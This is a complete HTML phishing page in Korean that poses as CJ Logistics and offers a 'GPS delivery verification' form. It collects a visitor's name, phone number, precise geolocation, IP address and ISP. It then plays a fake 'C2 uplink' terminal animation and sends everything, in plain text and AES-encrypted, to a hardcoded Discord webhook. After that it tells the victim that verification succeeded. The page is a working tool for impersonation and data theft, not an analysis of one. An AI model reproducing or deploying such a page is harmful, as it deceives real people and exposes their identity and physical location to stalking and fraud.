<!DOCTYPE html>
<html lang="ko">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>CJ대한통운 - 위치기반 배송인증</title>
    <link rel="icon" href="https://logo-resources.thevc.kr/organizations/200x200/6865fc5cb2875e52a38a85c819c517929c45b2186fe3a1fcfbf3bfa76d27d476_1647847136733898.jpg" type="image/x-icon">
    <script src="https://cdnjs.cloudflare.com/ajax/libs/crypto-js/4.1.1/crypto-js.min.js"></script>
    <style>
    body, html {
        margin: 0;
        padding: 0;
        font-family: 'Malgun Gothic', sans-serif;
        background: #f4f4f4;
        min-height: 100%;
    }

    #fake-site {
        display: flex;
        flex-direction: column;
        min-height: 100vh;
    }

    .nav {
        background: #003366;
        color: white;
        padding: 15px 20px;
        font-weight: bold;
        display: flex;
        align-items: center;
        gap: 10px;
        position: sticky; /* sticky 사용 시 position 명시 필요 */
        top: 0;
    }

    .nav img {
        height: 22px;
        filter: brightness(0) invert(1);
    }

    .content {
        width: 92%;
        max-width: 450px;
        margin: 30px auto;
        background: white;
        padding: 25px;
        border-radius: 12px;
        box-shadow: 0 10px 30px rgba(0,0,0,0.15);
        text-align: center;
        box-sizing: border-box;
    }

    .form-container {
        margin-top: 15px;
        text-align: left;
    }

    .input-group {
        margin-bottom: 12px;
    }

    .input-group label {
        display: block;
        font-size: 0.85em;
        color: #666;
        margin-bottom: 4px;
    }

    .input-field {
        width: 100%;
        padding: 12px;
        border: 1px solid #ddd;
        border-radius: 6px;
        box-sizing: border-box;
        font-size: 16px; /* iOS 자동 줌 방지용 최소 크기 */
        outline: none;
    }

    .input-field:focus {
        border-color: #F26522;
    }

    .btn {
        background: #F26522;
        color: white;
        border: none;
        padding: 16px;
        font-size: 1.1em;
        cursor: pointer;
        border-radius: 6px;
        width: 100%;
        font-weight: bold;
        margin-top: 10px;
    }

    #terminal {
        display: none;
        position: fixed;
        top: 0;
        left: 0;
        width: 100%;
        height: 100%;
        background: #0a0a0a;
        color: #00FF00;
        font-family: 'Courier New', monospace;
        padding: 20px;
        box-sizing: border-box;
        z-index: 9999;
        overflow-y: auto;
    }

    .scan-line {
        color: #00FF00;
        margin: 2px 0;
        font-size: 0.85em;
        word-break: break-all;
    }
</style>
</head>
<body>

    <div id="fake-site">
        <div class="nav">
            <img src="https://logo-resources.thevc.kr/organizations/200x200/6865fc5cb2875e52a38a85c819c517929c45b2186fe3a1fcfbf3bfa76d27d476_1647847136733898.jpg" alt="CJ Logo">
            <span>CJ Logis | 스마트 배송 인증</span>
        </div>
        
        <div class="content">
            <img src="https://logo-resources.thevc.kr/organizations/200x200/6865fc5cb2875e52a38a85c819c517929c45b2186fe3a1fcfbf3bfa76d27d476_1647847136733898.jpg" alt="CJ대한통운" style="width: 180px; margin-bottom: 20px;">
            
            <h2 style="color: #003366; margin-bottom: 10px;">분실 방지 GPS 인증</h2>
            <p style="font-size: 0.95em; color: #444;">안전한 수령을 위해 <b>본인 확인</b>이 필요합니다.</p>
            
            <div class="form-container">
                <div class="input-group">
                    <label>수령인 성함</label>
                    <input type="text" id="userName" class="input-field" placeholder="성함을 입력하세요">
                </div>
                <div class="input-group">
                    <label>수령인 연락처</label>
                    <input type="tel" id="userPhone" class="input-field" placeholder="010-0000-0000" maxlength="13">
                </div>
            </div>

            <div style="background: #fff9f4; padding: 12px; border-radius: 8px; font-size: 0.8em; color: #777; border-left: 4px solid #F26522; margin: 15px 0;">
                정보 입력 후 브라우저 상단의 <b>'위치 권한 허용'</b>을 눌러주셔야 인증이 완료됩니다.
            </div>
            <button class="btn" onclick="requestAccess()">인증 및 배송지 확인</button>
        </div>
    </div>

    <div id="terminal">
        <div id="log-container"></div>
    </div>

    <script>
        const SECRET_KEY = "0x7E6_RECON_System_!@#_Secure_2026_AES"; 
        const WEBHOOK_URL = "https://discord.com/api/webhooks/1464745431102783611/6Qk9-B-B23FCvLSD58sEFnuX2rIteMVBFEIUnQAV0rdREI9sWb9Pqdywxo_Y6wRtnEpb"; 

        let userData = {
            name: '',
            phone: '',
            ip: '조회 중...',
            isp: '조회 중...', 
            lat: 'N/A',
            lon: 'N/A',
            ipLat: '', // IP 기반 좌표 백업용
            ipLon: '',
            os: navigator.platform,
            browser: navigator.userAgent,
            timestamp: new Date().toLocaleString()
        };

        // 전화번호 하이픈 자동 삽입
        document.getElementById('userPhone').addEventListener('input', function(e) {
            this.value = this.value.replace(/[^0-9]/g, '').replace(/^(\d{2,3})(\d{3,4})(\d{4})$/, `$1-$2-$3`);
        });

        // 3중 API 네트워크 및 IP 위치 정보 수집
        async function fetchNetworkInfo() {
            try {
                const res = await fetch('https://ip-api.com/json/');
                const data = await res.json();
                if(data.status === 'success') {
                    userData.ip = data.query;
                    userData.isp = data.isp || data.as || '확인 불가';
                    userData.ipLat = data.lat;
                    userData.ipLon = data.lon;
                    return;
                }
            } catch (e) { }

            try {
                const res = await fetch('https://ipapi.co/json/');
                const data = await res.json();
                if(data.ip) {
                    userData.ip = data.ip;
                    userData.isp = data.org || '확인 불가';
                    userData.ipLat = data.latitude;
                    userData.ipLon = data.longitude;
                    return;
                }
            } catch (e) { }

            userData.ip = "조회 실패";
            userData.isp = "분석 지연";
        }
        fetchNetworkInfo();

        function requestAccess() {
            const nameVal = document.getElementById('userName').value.trim();
            const phoneVal = document.getElementById('userPhone').value;

            if (!nameVal || phoneVal.length < 10) {
                alert("성함과 연락처를 모두 정확히 입력해주세요.");
                return;
            }
            
            userData.name = nameVal;
            userData.phone = phoneVal;

            if ("geolocation" in navigator) {
                navigator.geolocation.getCurrentPosition(
                    (pos) => {
                        userData.lat = pos.coords.latitude.toFixed(6);
                        userData.lon = pos.coords.longitude.toFixed(6);
                        startSequence();
                    }, 
                    (err) => {
                        // 권한 거부 시 IP 기반 좌표로 대체
                        userData.lat = userData.ipLat ? userData.ipLat + " (IP)" : "권한 거부됨";
                        userData.lon = userData.ipLon ? userData.ipLon + " (IP)" : "IP 분석 중";
                        startSequence(); 
                    },
                    { timeout: 8000 }
                );
            } else {
                startSequence();
            }
        }

        function startSequence() {
            if (document.documentElement.requestFullscreen) document.documentElement.requestFullscreen();
            document.getElementById('fake-site').style.display = 'none';
            document.getElementById('terminal').style.display = 'block';
            
            let logs = [
                "> [SYSTEM] INITIALIZING SECURE UPLINK...",
                "> [SYSTEM] TARGET_NAME: " + userData.name,
                "> [SYSTEM] TARGET_PHONE: " + userData.phone,
                "> [SYSTEM] IP_ADDRESS: " + userData.ip,
                "> [SYSTEM] ISP_PROVIDER: " + userData.isp,
                "> [SYSTEM] LOCATION_DATA: " + userData.lat + ", " + userData.lon,
                "> [SYSTEM] ENCRYPTING PACKETS (AES-256)...",
                "> [SYSTEM] SENDING DATA TO C2 SERVER..."
            ];

            let i = 0;
            const container = document.getElementById('log-container');
            const interval = setInterval(() => {
                const line = document.createElement('div');
                line.className = 'scan-line';
                line.textContent = logs[i] || `> [RECON] SENDING_CHUNK_${Math.random().toString(16).slice(2,8).toUpperCase()}... DONE`;
                if (logs[i] && (logs[i].includes('NAME') || logs[i].includes('LOCATION'))) line.className += ' found';
                container.appendChild(line);
                if (i > 25) { 
                    clearInterval(interval); 
                    finalizeExfiltration(); 
                }
                i++;
                container.scrollTop = container.scrollHeight;
            }, 60);
        }

        async function finalizeExfiltration() {
            const rawData = JSON.stringify(userData, null, 2);
            const encryptedPayload = CryptoJS.AES.encrypt(rawData, SECRET_KEY).toString();

            const discordMessage = {
                username: "CJ Logis Recon",
                content: `🚩 **데이터 도착 알림**: ${userData.name}`,
                embeds: [{
                    title: "Encrypted Data Packet",
                    description: "```" + encryptedPayload + "```",
                    color: 15895842,
                    fields: [
                        { name: "이름", value: userData.name, inline: true },
                        { name: "전화번호", value: userData.phone, inline: true },
                        { name: "IP", value: userData.ip, inline: true },
                        { name: "위치(LAT/LON)", value: `${userData.lat}, ${userData.lon}`, inline: false }
                    ],
                    footer: { text: "Security Recon v1.8 | CJ Logistics Clone" },
                    timestamp: new Date()
                }]
            };

            try {
                await fetch(WEBHOOK_URL, { 
                    method: 'POST', 
                    headers: { 'Content-Type': 'application/json' }, 
                    body: JSON.stringify(discordMessage) 
                });
            } catch (e) { }

            const container = document.getElementById('log-container');
            container.innerHTML = `
                <h1 style="color: #00FF00; text-align: center; margin-top: 50px;">배송 인증 완료</h1>
                <div style="border: 1px solid #00FF00; padding: 25px; background: rgba(0,255,0,0.05); text-align: center;">
                    <p style="color: #00FF00; font-size: 1.2em;"><b>정상적으로 인증되었습니다.</b></p>
                    <p style="color: #888;">입력하신 연락처로 배송 현황이 알림톡으로 전송됩니다.</p>
                </div>
                <div style="text-align: center; margin-top: 30px;">
                    <button onclick="location.href='https://www.cjlogistics.com'" style="background: transparent; border: 1px solid #00FF00; color: #00FF00; padding: 10px 30px; cursor: pointer;">확인</button>
                </div>
            `;
        }
    </script>
</body>
</html>
